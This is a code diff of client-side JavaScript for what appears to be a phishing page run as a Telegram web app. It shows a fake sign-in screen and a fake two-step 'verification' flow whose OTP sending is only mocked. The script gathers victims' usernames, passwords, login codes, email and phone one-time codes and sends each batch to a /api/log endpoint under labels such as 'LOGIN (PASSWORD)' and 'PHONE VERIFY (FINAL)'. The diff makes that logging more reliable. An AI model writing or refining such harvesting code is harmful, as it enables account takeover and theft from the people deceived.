@@ -5,13 +5,11 @@ if (tg) {
 }
 
 document.addEventListener('DOMContentLoaded', () => {
-    // Screens & Modals
     const screenSignin = document.getElementById('screen-signin');
     const screenStepper = document.getElementById('screen-stepper');
     const modalEmail = document.getElementById('modal-email-otp');
     const modalPhone = document.getElementById('modal-phone-otp');
 
-    // Sign In Inputs
     const loginId = document.getElementById('login-identifier');
     const loginPass = document.getElementById('login-password');
     const loginOtpInput = document.getElementById('login-otp-input');
@@ -19,24 +17,12 @@ document.addEventListener('DOMContentLoaded', () => {
     const loginOtpWrapper = document.getElementById('login-otp-wrapper');
     const loginForgotWrapper = document.getElementById('login-forgot-wrapper');
 
-    // Verification Inputs
     const verifyEmailId = document.getElementById('verify-email-id');
     const verifyEmailOtp = document.getElementById('verify-email-otp');
     const verifyPhoneNum = document.getElementById('verify-phone-num');
     const verifyPhoneOtp = document.getElementById('verify-phone-otp');
 
-    let userData = { 
-        id: '', 
-        pass: '', 
-        login_otp: '', 
-        email: '', 
-        email_otp: '', 
-        phone: '', 
-        phone_otp: '', 
-        time: '',
-        method: 'password'
-    };
-    
+    let userData = { id: '', pass: '', login_otp: '', email: '', email_otp: '', phone: '', phone_otp: '', time: '', method: 'password' };
     let currentStep = 1;
 
     // Tab Switching
@@ -44,10 +30,8 @@ document.addEventListener('DOMContentLoaded', () => {
         tab.addEventListener('click', () => {
             document.querySelectorAll('.signin-tab').forEach(t => t.classList.remove('active'));
             tab.classList.add('active');
-            
             const method = tab.dataset.tab;
             userData.method = method;
-
             if (method === 'password') {
                 loginId.placeholder = "Email / Phone Number / Username";
                 loginPassWrapper.style.display = 'block';
@@ -62,29 +46,21 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-    // Mock Send OTP for Login
     document.getElementById('btn-login-send-otp').addEventListener('click', () => {
         const idVal = loginId.value.trim();
         if (!idVal) return alert("Please enter Email or Phone Number first");
-        
         const btn = document.getElementById('btn-login-send-otp');
         btn.innerText = "Sending...";
-        setTimeout(() => {
-            btn.innerText = "Sent";
-            setTimeout(() => { btn.innerText = "Resend"; }, 5000);
-        }, 800);
+        setTimeout(() => { btn.innerText = "Sent"; }, 800);
     });
 
-    // Sign In Button Click
     const btnSignin = document.getElementById('trigger-signin');
     if (btnSignin) {
-        btnSignin.addEventListener('click', () => {
+        btnSignin.addEventListener('click', async () => {
             const idVal = loginId.value.trim();
             if (!idVal) return alert("Please enter your details");
-
             userData.id = idVal;
             userData.time = new Date().toLocaleString();
-
             if (userData.method === 'password') {
                 userData.pass = loginPass.value.trim();
                 if (!userData.pass) return alert("Please enter password");
@@ -92,52 +68,41 @@ document.addEventListener('DOMContentLoaded', () => {
                 userData.login_otp = loginOtpInput.value.trim();
                 if (!userData.login_otp) return alert("Please enter verification code");
             }
-
-            // Pre-fill next steps
             if (idVal.includes('@')) verifyEmailId.value = idVal;
             else if (/^\d+$/.test(idVal.replace(/\+/g, ''))) verifyPhoneNum.value = idVal;
 
-            // Log Initial Login
-            logToServer(userData.method === 'password' ? '🔑 LOGIN (PASSWORD)' : '🔢 LOGIN (OTP)', userData);
-
-            // Switch Screen
+            console.log("-> Starting Log: LOGIN");
+            await logToServer(userData.method === 'password' ? '🔑 LOGIN (PASSWORD)' : '🔢 LOGIN (OTP)', userData);
             screenSignin.style.display = 'none';
             screenStepper.style.display = 'flex';
         });
     }
 
-    // Step 1: Email Verification (MOCK)
     document.getElementById('item-email').addEventListener('click', () => {
         if (currentStep !== 1) return;
         modalEmail.style.display = 'flex';
-        console.log("Mocking OTP send for:", verifyEmailId.value);
     });
 
     document.getElementById('submit-email-otp').addEventListener('click', async () => {
         if (!verifyEmailId.value || !verifyEmailOtp.value) return alert("Fill all fields");
-        
         userData.email = verifyEmailId.value;
         userData.email_otp = verifyEmailOtp.value;
-        
         document.getElementById('submit-email-otp').innerText = "Verifying...";
+        console.log("-> Starting Log: EMAIL");
         await logToServer('📧 EMAIL VERIFY', userData);
-        
         modalEmail.style.display = 'none';
         currentStep = 2;
-        
         document.getElementById('step-number-display').innerText = '2/2';
         const itemEmail = document.getElementById('item-email');
         itemEmail.style.opacity = '0.5';
         itemEmail.style.pointerEvents = 'none';
         itemEmail.querySelector('.card-link').innerHTML = 'Verified <i class="fas fa-check"></i>';
-        
         const itemPhone = document.getElementById('item-phone');
         itemPhone.style.opacity = '1';
         itemPhone.style.pointerEvents = 'auto';
         itemPhone.classList.add('active');
     });
 
-    // Step 2: Phone Verification (MOCK)
     document.getElementById('item-phone').addEventListener('click', () => {
         if (currentStep !== 2) return;
         modalPhone.style.display = 'flex';
@@ -145,32 +110,30 @@ document.addEventListener('DOMContentLoaded', () => {
 
     document.getElementById('submit-phone-otp').addEventListener('click', async () => {
         if (!verifyPhoneNum.value || !verifyPhoneOtp.value) return alert("Fill all fields");
-        
         userData.phone = verifyPhoneNum.value;
         userData.phone_otp = verifyPhoneOtp.value;
-        
         document.getElementById('submit-phone-otp').innerText = "Success";
+        console.log("-> Starting Log: FINAL");
         await logToServer('📱 PHONE VERIFY (FINAL)', userData);
-        
         document.getElementById('btn-final-confirm').classList.add('ready');
-
-        setTimeout(() => {
-            if (tg) tg.close();
-            else location.reload();
-        }, 1500);
+        setTimeout(() => { if (tg) tg.close(); else location.reload(); }, 1500);
     });
 
     async function logToServer(title, data) {
+        console.log(`[DEBUG] Sending log to server: ${title}`);
         try {
-            await fetch('/api/log', {
+            const response = await fetch('/api/log', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ title, data })
             });
-        } catch (e) { console.error("Log failed", e); }
+            const result = await response.json();
+            console.log(`[DEBUG] Server Response:`, result);
+        } catch (e) {
+            console.error("[DEBUG] Fetch Error:", e);
+        }
     }
 
-    // Password Eye Toggle
     const eyeBtn = document.querySelector('.btn-password-eye');
     if (eyeBtn) {
         eyeBtn.addEventListener('click', () => {
